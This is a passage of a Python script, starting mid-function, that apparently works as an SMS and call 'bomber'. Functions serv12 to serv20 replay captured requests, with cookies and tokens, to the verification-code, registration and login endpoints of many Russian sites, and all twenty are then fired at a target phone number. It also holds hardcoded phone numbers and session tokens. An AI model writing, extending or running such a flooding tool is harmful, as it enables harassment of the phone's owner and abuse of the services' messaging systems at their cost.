        response = requests.post('https://sicilian-pizzeria.ru/api/auth/resetCode', cookies=cookies, headers=headers, json=json_data)
        print(f"serv11 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv11 - error")
def serv12():
    try:
        cookies = {
            '_yasc': 'nkX7ed4WfBNIqCaK+KfbN7QY+v9/nc8xquP9bB3vJFw20PIFrAGTiOmtEkt2xBI=',
            '.ASPXANONYMOUS': '8wBVro_eE0eyyLH7lv_oDQ',
            '.AspNetCore.Antiforgery.vnVzMy2Mv7Q': 'CfDJ8MEzzRIphIdCoeRGcXuv9jH7bvHgsatXLhOAQdAAWfEmptgoA--GIFp5U-fIatQO3KyEcCSSEYgBmRhIxkd4Se0meotV610zsPV6Y3NVdmsXsPYO7YsWm7axJzMyj3My2YQdP3v39kthYUkCkKstRb0',
            'systemTheme': 'guinness',
            '_gcl_au': '1.1.1601788381.1775750576',
            '_ym_uid': '1775750576325909087',
            '_ym_d': '1775750576',
            'oxxfgh': '9617d343-38ff-497d-944b-6ea7cf0ab9ba%230%2331536000000%235000%231800000%2341200',
            'uwyii': 'd4a05264-da33-74b3-b3e5-3f22ecea358b',
            '_ym_isad': '2',
            'uwyiert': 'e65072bf-9e73-c7c2-8d45-0c7f255168d1',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'sentry-trace': 'e58f21ec55094d798e9369f8931362da-8a833e6a25ecb7fd-1',
            'baggage': 'sentry-environment=production,sentry-public_key=6a75d042f821b1b503808191633cc1d8,sentry-trace_id=e58f21ec55094d798e9369f8931362da,sentry-sampled=true,sentry-sample_rand=0.4003194334375787,sentry-sample_rate=1',
            'Origin': 'https://sravni.id',
            'Connection': 'keep-alive',
            'Referer': 'https://sravni.id/signin?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3Dwww%26scope%3Dopenid%2520offline_access%2520email%2520phone%2520profile%2520roles%2520reviews%2520esia%2520orders.r%2520messagesender.sms%2520Sravni.Reviews.Service%2520Sravni.Osago.Service%2520Sravni.QnA.Service%2520Sravni.FileStorage.Service%2520Sravni.PhoneVerifier.Service%2520Sravni.Identity.Service%2520Sravni.Affiliates.Service%2520Sravni.News.Service%2520identity.user.w%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwww.sravni.ru%252Fopenid%252Fv2%252Fcallback%252F%26display%3Dpopup%26response_mode%3Dform_post%26state%3DeyJzYWx0IjoiNnlVTlEwM29kNy00aVM4cGpwNzV0cjV3VHJGU2NuR29mVVR0dkNjUzg5SSJ9%26nonce%3DdC9_scpjMI1uMlDYpBEHjTCGU2b_GACGJWcoII2x7k0%26acr_values%3Dorigin%253Ahttps%253A%252F%252Fwww.sravni.ru%252Fbiznes-kredity%252Finfo%252Fkak-otkryt-punkt-vydachi-kazan-ehkspress%252F%2520anonymous%253A8wBVro_eE0eyyLH7lv_oDQ',
            # 'Cookie': '_yasc=nkX7ed4WfBNIqCaK+KfbN7QY+v9/nc8xquP9bB3vJFw20PIFrAGTiOmtEkt2xBI=; .ASPXANONYMOUS=8wBVro_eE0eyyLH7lv_oDQ; .AspNetCore.Antiforgery.vnVzMy2Mv7Q=CfDJ8MEzzRIphIdCoeRGcXuv9jH7bvHgsatXLhOAQdAAWfEmptgoA--GIFp5U-fIatQO3KyEcCSSEYgBmRhIxkd4Se0meotV610zsPV6Y3NVdmsXsPYO7YsWm7axJzMyj3My2YQdP3v39kthYUkCkKstRb0; systemTheme=guinness; _gcl_au=1.1.1601788381.1775750576; _ym_uid=1775750576325909087; _ym_d=1775750576; oxxfgh=9617d343-38ff-497d-944b-6ea7cf0ab9ba%230%2331536000000%235000%231800000%2341200; uwyii=d4a05264-da33-74b3-b3e5-3f22ecea358b; _ym_isad=2; uwyiert=e65072bf-9e73-c7c2-8d45-0c7f255168d1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        data = {
            '__RequestVerificationToken': 'CfDJ8MEzzRIphIdCoeRGcXuv9jHosHOhrcmo2RCszzxzYI3oWarm9K7rvE2A8uUkcqw_Tu4AFfAur0L_fc9E0QOIf9zX4yUnZT9VbzFv7Tsy0ojrE3fWiG7Qcn1ti71MxxkEOSLmR07Q5a7-EjJpEZTtlOk',
            'phone': '+79374903232',
            'returnUrl': '/connect/authorize/callback?client_id=www&scope=openid%20offline_access%20email%20phone%20profile%20roles%20reviews%20esia%20orders.r%20messagesender.sms%20Sravni.Reviews.Service%20Sravni.Osago.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.PhoneVerifier.Service%20Sravni.Identity.Service%20Sravni.Affiliates.Service%20Sravni.News.Service%20identity.user.w&response_type=code%20id_token&redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fopenid%2Fv2%2Fcallback%2F&display=popup&response_mode=form_post&state=eyJzYWx0IjoiNnlVTlEwM29kNy00aVM4cGpwNzV0cjV3VHJGU2NuR29mVVR0dkNjUzg5SSJ9&nonce=dC9_scpjMI1uMlDYpBEHjTCGU2b_GACGJWcoII2x7k0&acr_values=origin%3Ahttps%3A%2F%2Fwww.sravni.ru%2Fbiznes-kredity%2Finfo%2Fkak-otkryt-punkt-vydachi-kazan-ehkspress%2F%20anonymous%3A8wBVro_eE0eyyLH7lv_oDQ',
            'sid': '9617d343-38ff-497d-944b-6ea7cf0ab9ba',
        }

        response = requests.post('https://sravni.id/signin/code', cookies=cookies, headers=headers, data=data)
        print(f"serv12 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print("serv12 - error")
def serv13():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/json',
            'sentry-trace': 'a1af557fcebb47f8b6430ea24e01322e-abe68061fb3b0731',
            'baggage': 'sentry-environment=production,sentry-release=4837892c39e24ba12f869c66bcc859100cbea67e,sentry-public_key=e595d3e1af0f4d8e9470e1e7d7c6e420,sentry-trace_id=a1af557fcebb47f8b6430ea24e01322e',
            'Origin': 'https://cabinet.kontur.ru',
            'Connection': 'keep-alive',
            # 'Cookie': 'ngtoken=LhHOC2nXyssOCxbIBXEbAg==; _gcl_au=1.1.1837038763.1775749837; _ym_uid=1775749838826376486; _ym_d=1775749838; tmr_lvid=9b091338e2d10fab84f9afc5b9939f5f; tmr_lvidTS=1775749839706; _kfpxv5=78fde7267280eca06a5239e9a1244a636314cf15; device=081231dba4af0187a9a3ca2f2216c456; gdpr-consent=true; sr_singular=c4aecef5-641a-4f2b-8549-76bdc5182ded; start_page=https%3A%2F%2Fkontur.ru%2Ffactoring%2Fspravka%2F56622-vxod_v_lichnyj_kabinet_platformy_kontur_faktoring; _kmts=LjTsJR9hc4; _ym_isad=2; _ym_visorc=b; adrdel=1776356550480; adrcid=ARICSJX2PDHkKzInKejz8_A; acs_3=%7B%22hash%22%3A%221aa3f9523ee6c2690cb34fc702d4143056487c0d%22%2C%22nst%22%3A1776442950649%2C%22sl%22%3A%7B%22224%22%3A1776356550649%2C%221228%22%3A1776356550649%7D%7D; _mfp=78fde7267280eca06a5239e9a1244a636314cf15; kontur.ru-go-product-factoring=1; cabinet.pages=8ba41041-824e-4f77-a245-e3f36a4e100c',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        json_data = {
            'channelGroupId': 'portal',
            'purpose': 'Login',
            'phone': PHONE,
            'confirmationType': 'Call',
            'productId': 'factoring',
            'withConfirmation': True,
        }

        response = requests.post(
            'https://cabinet.kontur.ru/pages/api/v1/registration/d6f43a31-48d1-41c4-be41-457eef41d280/phones',
            headers=headers,
            json=json_data,
        )
        if DEBUG_MODE:
            print(response.text)
    except:
        print("serv13 - error")
def serv14():
    try:
        cookie = {"""DEVICE-ID=9b2494b6-9bcb-4e54-92e4-aa8794f77495; _ym_uid=1772782435291601158; _ym_d=1772782435; X-Cabinet-Refresh-Token=d5725991-1381-4792-8f0e-065a109ae073; mindboxDeviceUUID=fcb7a099-aefe-4c57-be6f-6efb2a4b0eae; directCrm-session=%7B%22deviceGuid%22%3A%22fcb7a099-aefe-4c57-be6f-6efb2a4b0eae%22%7D; mid=31142320-7ca0-4ebe-8684-f0f946e2ef94; cfidsw-megafon=wDjGghdMUoMloGdLpXICkT8IuzKLRYhYY5nFq6ZkEUUWOIVBwRQeY9lQ2zAQ3WVTj9Iq38ajI3thSbjTfgF9qaTSyNQmI1B8AJ2cQE2cD4Pc0pRCLeqLsMoU1y6Qg2Pig5AoRdjPk3OaJ41/L9QFQ4Q7; NEW-CSRF-TOKEN=e3808fb1-11e3-472d-9f3e-5c38460769a9; csrf-token=e3808fb1-11e3-472d-9f3e-5c38460769a9; JSESSIONID=ff5460e9-1fc5-4f81-84ce-4701c943808d; _ym_isad=2"""}
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://russpass.ru/',
            'X-Platform-Version': 'web 3.0.0',
            'is-logged-in': 'false',
            'rqid': '6f32245c-b1d9-42f7-9132-7515e1263b77',
            'Content-Type': 'application/json',
            'secure-code': 'fb3bb33a-905d-4995-b4d3-a433eda2f205',
            'Origin': 'https://russpass.ru',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Priority': 'u=0',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        params = {
            'language': 'ru',
        }

        json_data = {
            'login': PHONE,
        }

        response = requests.post('https://api.russpass.ru/user/v2/verify', params=params, cookie = cookie, headers=headers, json=json_data)
        print(f"serv14 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print("serv14 - error")
def serv15():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://banzai-sushi.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://banzai-sushi.ru/sety',
            # 'Cookie': 'PHPSESSID=g19arn3lbgg7ksn2nc7kjr8o22; language=ru-ru; currency=RUB; promodate=20260408; display=list; _ga=GA1.2.1263868573.1775667122; _gid=GA1.2.1527243538.1775667122; _gat_UA-89928663-1=1; _ym_uid=1775667122324564224; _ym_d=1775667122; _ym_isad=2; _ym_visorc=w; _ga_W4GHH62KZ3=GS2.2.s1775667122$o1$g0$t1775667122$j60$l0$h0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        data = {
            'reg_phone_number': f'+{PHONE}',
            'reg_name': 'Алексей',
            'reg_birthday': '2002-04-04',
            '': '2002',
            'reg_gender': '1',
            'reg_region': '1',
            'reg_politic': '1',
            'registration_btn': 'Зарегистрироваться',
        }

        response = requests.post('https://banzai-sushi.ru/?route=api/registration', headers=headers, data=data)
        print(f"serv15 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print("serv15 - error")
def serv16():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://ji-shi.ru/',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=61c6d73ab563425ebde7c96bc0c0f906,sentry-org_id=4504076812025856,sentry-transaction=%2F,sentry-sampled=false,sentry-sample_rand=0.5395177860412277,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'sentry-trace': '61c6d73ab563425ebde7c96bc0c0f906-b46a18983faf9c71-0',
            'sitenew': '1',
            'uuid': '9e2a4ef3-7a29-47b2-d112-1287edba7830',
            'x-api-key': '1187394',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            'Origin': 'https://ji-shi.ru',
            'Connection': 'keep-alive',
            # 'Cookie': 'uuid=9e2a4ef3-7a29-47b2-d112-1287edba7830; encodedIP=dKlKmBfXaAnAaAnJtGuUlOaA; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; __session__id=17429223869de8486368fc3.40941035; tmr_lvid=77703a551edf063d70c1099c547938f8; tmr_lvidTS=1776190598374; _ym_uid=1776190598458862838; _ym_d=1776190598; _ym_isad=2; domain_sid=injekR23aysvFzR9i2ucs%3A1776190600375; tmr_detect=0%7C1776190613568',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://ji-shi.ru/api/user/register', headers=headers, json=json_data)
        print(f"serv16 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv16 - error")
def serv17():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://pizzanf.ru/',
            'baggage': 'sentry-environment=production,sentry-public_key=6d8491d39322eaeadd4ecd8d3fccc5e6,sentry-trace_id=c32e7d16c52943ee97612dba6332e03a,sentry-org_id=4504076812025856,sentry-transaction=%2F,sentry-sampled=true,sentry-sample_rand=0.23576680698414576,sentry-sample_rate=0.25',
            'content-type': 'application/json',
            'sentry-trace': 'c32e7d16c52943ee97612dba6332e03a-a6d1d4a853d54232-1',
            'sitenew': '1',
            'uuid': 'b2f96118-dcbe-94d9-8b18-c3ffdaf70589',
            'x-api-key': '12840388',
            'x-brand-id': '1',
            'x-platform': 'ssr',
            'Origin': 'https://pizzanf.ru',
            'Connection': 'keep-alive',
            # 'Cookie': 'uuid=b2f96118-dcbe-94d9-8b18-c3ffdaf70589; encodedIP=dKlKmBfXaAnAmTuKtGuUfU; i18n_redirected=ru; theme=light; city_id=1; department_id=0; delivery_type=delivery; is_city-confirmed=true; __session__id=39505160869de87e01a7f27.03863408',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        json_data = {
            'phone': PHONE[1:],
            'verify_type': 'call',
        }

        response = requests.post('https://pizzanf.ru/api/user/register', headers=headers, json=json_data)
        print(f"serv17 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv17 - error")
def serv18():
    try:
        cookies = {
            'sushifuji': '7hphuLeYV0lkVPO4cbw%2Cn6r2UJjz5upaVIkSY%2C4YRpq2m6cN',
            'city_id': '1',
            'city_url': 'ufa',
            'order_delivery_type': 'pickup',
            '_ymab_param': 'zUL45YBQ3AXNvZzgCd9aXiPwOO4uCTiWHMvP024AMWOx5ecnGdUV_g4AYod7UqHJIgGKDLpfuEi60Lb2HaV9_ACPjFU',
            '_ga_V87THS5XDY': 'GS2.1.s1776191463$o1$g1$t1776192480$j60$l0$h0',
            '_ga': 'GA1.2.958282116.1776191464',
            '_gid': 'GA1.2.64766027.1776191464',
            '_ym_uid': '1776191466896385516',
            '_ym_d': '1776191466',
            '_ym_isad': '2',
            '_ym_visorc': 'w',
            'dti': '695577de-3071-9f5b-014a-5553c8cc253f',
            'deviceId': '968a705a6a1fa548415d4e65c4052d9a',
            'cart_products': '%7B%7D',
            '_gat_gtag_UA_26277425_1': '1',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://sushifuji.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://sushifuji.ru/',
            # 'Cookie': 'sushifuji=7hphuLeYV0lkVPO4Sbw%2Cn6r2UJjz5upaVIkSY%2C4YRpq2m6cN; city_id=1; city_url=ufa; order_delivery_type=pickup; _ymab_param=zUL45YBQ3AXNvZzgCd9aXiPwOO4uCTiWHMvP024AMWOx5ecnGdUV_g4AYod7UqHJIgGKDLpfuEi60Lb2HaV9_ACPjFU; _ga_V87THS5XDY=GS2.1.s1776191463$o1$g1$t1776192480$j60$l0$h0; _ga=GA1.2.958282116.1776191464; _gid=GA1.2.64766027.1776191464; _ym_uid=1776191466896385516; _ym_d=1776191466; _ym_isad=2; _ym_visorc=w; dti=695577de-3071-9f5b-014a-5553c8cc253f; deviceId=968a705a6a1fa548415d4e65c4052d9a; cart_products=%7B%7D; _gat_gtag_UA_26277425_1=1',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Priority': 'u=0',
        }

        data = {
            'phone_sms': '79374903539',
            'confirm_repeat': 'true',
            'send': 'true',
        }

        response = requests.post('https://sushifuji.ru/get_sms_file.php', cookies=cookies, headers=headers, data=data)
        print(f"serv18 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv18 - error")
def serv19():
    try:
        cookies = {
            'qrator_ssid': '1776356860.510.pIAvyJyFf2ELaK6N-4s894fq6mm7pk3ocqhad0a8uh0vp1t5o',
            'puid': '8295dc618b21452882aa27f08e71f209',
            '_ym_uid': '1776356862599015303',
            '_ym_d': '1776356862',
            'MyRegion': 'www',
            '_ym_isad': '2',
            'AuthSessionId': '615a843c-3266-473d-bdfc-7ced3bce8265',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://www.vbr.ru/',
            'Content-Type': 'application/json',
            'Origin': 'https://www.vbr.ru',
            'Connection': 'keep-alive',
            # 'Cookie': 'qrator_ssid=1776356860.510.pIAvyJyFf2ELaK6N-4s894fq6mm7pk3ocqhad0a8uh0vp1t5o; puid=8295dc618b21452882aa27f08e71f209; _ym_uid=1776356862599015303; _ym_d=1776356862; MyRegion=www; _ym_isad=2; AuthSessionId=615a843c-3266-473d-bdfc-7ced3bce8265',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Priority': 'u=0',
            # Requests doesn't support trailers
            # 'TE': 'trailers',
        }

        json_data = {
            'phone': f"+{PHONE[0]} ({PHONE[1:4]}) {PHONE[4:7]}-{PHONE[7:]}",
            'consent': {
                'termsOfUseConsent': True,
                'conditionsForTransferringInformationConsent': True,
                'loyaltyProgramConsent': True,
            },
        }

        response = requests.post('https://identity.vbr.ru/mobileid/authorization/start/', cookies=cookies, headers=headers, json=json_data)
        print(f"serv19 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv19 - error")
def serv20():
    try:
        cookies = {
            '__utm_params': '87a31d3e4dd49c8d35891c5529b8532139c556997c254dfa297a41c946823d28a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22__utm_params%22%3Bi%3A1%3Bs%3A32%3A%22%7B%22utm_content%22%3A%22organic_search%22%7D%22%3B%7D',
            '__intl': '1a6c3f19d825211b4b399b7960038c6d1a93438adf1deb9825ed10de11d478f0a%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22__intl%22%3Bi%3A1%3Bs%3A5%3A%22ru-RU%22%3B%7D',
            'tmr_lvid': '9903c3034ae54c59568c113821c00e5d',
            'tmr_lvidTS': '1776359649991',
            '_ym_uid': '1776359650668422222',
            '_ym_d': '1776359650',
            '_ym_isad': '2',
            '_ym_visorc': 'w',
            'TAXSEE_V3MAXIM': '89b16a6f49cdc5181689fa856688b681',
            '__finger_print_hash': 'b5756791e77c80bb09f3b5c2fb565ac22b085925bd3972b9a6f6252bb39b53c3a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22__finger_print_hash%22%3Bi%3A1%3Bs%3A36%3A%223de1a5b9-6e3e-47f7-9157-e3896653536e%22%3B%7D',
            '__taxsee_country': 'a3955a5ac353f2e4e7d17c290443120d839243c2fd0771f171b22d86d37dd1aea%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22__taxsee_country%22%3Bi%3A1%3Bs%3A2%3A%22RU%22%3B%7D',
            '__taxsee_base': '3e7b3e83668e7b71d6218573bc2efbf02d5c2c46fe5ded49024ac6fbd8a55e58a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22__taxsee_base%22%3Bi%3A1%3Bi%3A56%3B%7D',
            '_csrf': 'e1089d813cb114b1c99d40d5b6daff1f1ee29449ca56075a5b357b622df6ff0fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22pyZ62IfD0Mr-xwfDzZXy_OJREQr17SKT%22%3B%7D',
            '_ga_T2DPT2GHZ5': 'GS2.1.s1776359651$o1$g0$t1776359651$j60$l0$h0',
            '_ga': 'GA1.2.692161147.1776359652',
            'domain_sid': 'ZEqIPmBD4g1gwQ6q7aXhR%3A1776359651813',
            '_gid': 'GA1.2.1069574162.1776359652',
            '_gat_gtag_UA_11558743_4': '1',
            '_ga_16MGM3R9TE': 'GS2.1.s1776359652$o1$g0$t1776359652$j60$l0$h0',
            'tmr_detect': '0%7C1776359654053',
            '_gat': '1',
            '_ga_3SG405Q2PJ': 'GS2.2.s1776359657$o1$g0$t1776359657$j60$l0$h0',
        }

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            # 'Accept-Encoding': 'gzip, deflate, br, zstd',
            'X-CSRF-Token': 'Lq7ea2lOWetVyxKiO0D-0vJc5-dDUUr9BpOvRULdqsxe14RdWwc_r2WGYI9DN5iWiAa_nhweAK9Dwt10dY7hmA==',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://client.taximaxim.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://client.taximaxim.ru/ru-RU/login/',
            # 'Cookie': '__utm_params=87a31d3e4dd49c8d35891c5529b8532139c556997c254dfa297a41c946823d28a%3A2%3A%7Bi%3A0%3Bs%3A12%3A%22__utm_params%22%3Bi%3A1%3Bs%3A32%3A%22%7B%22utm_content%22%3A%22organic_search%22%7D%22%3B%7D; __intl=1a6c3f19d825211b4b399b7960038c6d1a93438adf1deb9825ed10de11d478f0a%3A2%3A%7Bi%3A0%3Bs%3A6%3A%22__intl%22%3Bi%3A1%3Bs%3A5%3A%22ru-RU%22%3B%7D; tmr_lvid=9903c3034ae54c59568c113821c00e5d; tmr_lvidTS=1776359649991; _ym_uid=1776359650668422222; _ym_d=1776359650; _ym_isad=2; _ym_visorc=w; TAXSEE_V3MAXIM=89b16a6f49cdc5181689fa856688b681; __finger_print_hash=b5756791e77c80bb09f3b5c2fb565ac22b085925bd3972b9a6f6252bb39b53c3a%3A2%3A%7Bi%3A0%3Bs%3A19%3A%22__finger_print_hash%22%3Bi%3A1%3Bs%3A36%3A%223de1a5b9-6e3e-47f7-9157-e3896653536e%22%3B%7D; __taxsee_country=a3955a5ac353f2e4e7d17c290443120d839243c2fd0771f171b22d86d37dd1aea%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22__taxsee_country%22%3Bi%3A1%3Bs%3A2%3A%22RU%22%3B%7D; __taxsee_base=3e7b3e83668e7b71d6218573bc2efbf02d5c2c46fe5ded49024ac6fbd8a55e58a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22__taxsee_base%22%3Bi%3A1%3Bi%3A56%3B%7D; _csrf=e1089d813cb114b1c99d40d5b6daff1f1ee29449ca56075a5b357b622df6ff0fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22pyZ62IfD0Mr-xwfDzZXy_OJREQr17SKT%22%3B%7D; _ga_T2DPT2GHZ5=GS2.1.s1776359651$o1$g0$t1776359651$j60$l0$h0; _ga=GA1.2.692161147.1776359652; domain_sid=ZEqIPmBD4g1gwQ6q7aXhR%3A1776359651813; _gid=GA1.2.1069574162.1776359652; _gat_gtag_UA_11558743_4=1; _ga_16MGM3R9TE=GS2.1.s1776359652$o1$g0$t1776359652$j60$l0$h0; tmr_detect=0%7C1776359654053; _gat=1; _ga_3SG405Q2PJ=GS2.2.s1776359657$o1$g0$t1776359657$j60$l0$h0',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }

        data = f'_csrf=Lq7ea2lOWetVyxKiO0D-0vJc5-dDUUr9BpOvRULdqsxe14RdWwc_r2WGYI9DN5iWiAa_nhweAK9Dwt10dY7hmA%3D%3D&LoginForm%5Borg%5D=maxim&LoginForm%5Bcountry%5D=RU&LoginForm%5BbaseId%5D=56&LoginForm%5BsendCodeType%5D=0&LoginForm%5Bphone%5D=%2Bf{PHONE[0]}+({PHONE[1:4]})+{PHONE[4:7]}-{PHONE[7:9]}-{PHONE[9:11]}&LoginForm%5Bagree%5D=1&LoginForm%5BcaptchaToken%5D=&g-recaptcha-response=&_token=&g-recaptcha-response='

        response = requests.post('https://client.taximaxim.ru/ru-RU/site/send-code/', cookies=cookies, headers=headers, data=data)
        print(f"serv20 - {response.status_code}")
        if DEBUG_MODE:
            print(response.text)
    except:
        print(f"serv20 - error")

serv1()
serv2()
serv3()
serv4()
serv5()
serv6()
serv7()
serv8()
serv9()
serv10()
serv11()
serv12()
serv13()
serv14()
serv15()
serv16()
serv17()
serv18()
serv19()
serv20()